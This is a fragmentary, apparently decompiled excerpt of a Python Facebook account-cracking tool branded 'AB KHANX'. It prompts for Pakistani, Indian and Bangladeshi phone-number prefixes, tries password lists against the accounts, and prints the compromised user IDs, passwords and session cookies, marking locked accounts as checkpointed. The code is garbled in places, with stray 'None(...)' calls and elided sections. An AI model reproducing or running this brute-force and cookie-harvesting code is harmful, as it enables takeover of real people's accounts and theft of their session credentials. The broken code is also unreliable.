...
def o():
    ...
    jalan(' \x1b[1;32m[4] \x1b[1;32mJOIN YOUTUBE CHENNAI')
    ...
    if None == '0':
        os.system('exit')
        return None
    None('\n\x1b[1;32m  Choose valid option\x1b[1;32m')
...
[•]FACEBOOK       : \033[1;32mAB KHANX\033[1;33m
[•]YOUTUBE        : \033[1;32mMSS TRICKS\033[1;32m
[•]STATUS         : \033[1;32mFREE\033[1;33m
--------------------------------------------------"""
...
try:
    print('\n\n\033[1;32mLoading asset files ... \033[1;32m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
...
except:print('\n\033[1;32mNo internet connection ... \033[1;32m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
...
def i():
    ...
    jalan('\033[1;32m     \t     PAK CODES\n     \033[1;32m92301, \033[1;32m92302 ,\033[1;32m92303 ,\033[1;33m92305  ...\033[1;32m')
    jalan('\033[1;32m============================================')
    jalan('\033[1;32m     \t     INDIA CODES\n     \033[1;32m91778, \033[1;32m91930 ,\033[1;32m91902 ,\033[1;32m91712  ...\033[1;32m')
    jalan('\033[1;32m============================================')
    jalan('\033[1;32m     \t     BD CODES\n     \033[1;32m88016, \033[1;32m88017 ,\033[1;32m88018 ,\033[1;32m88019  ...\033[1;32m')
    jalan('\033[1;32m============================================\n')
    code = input(' PUT CODE : ')
    print("")
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(AB-KHANX-OKðŸ”¥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(AB-KHANX-CPðŸ¤•)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write('\r     %s[AB-KHANX] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
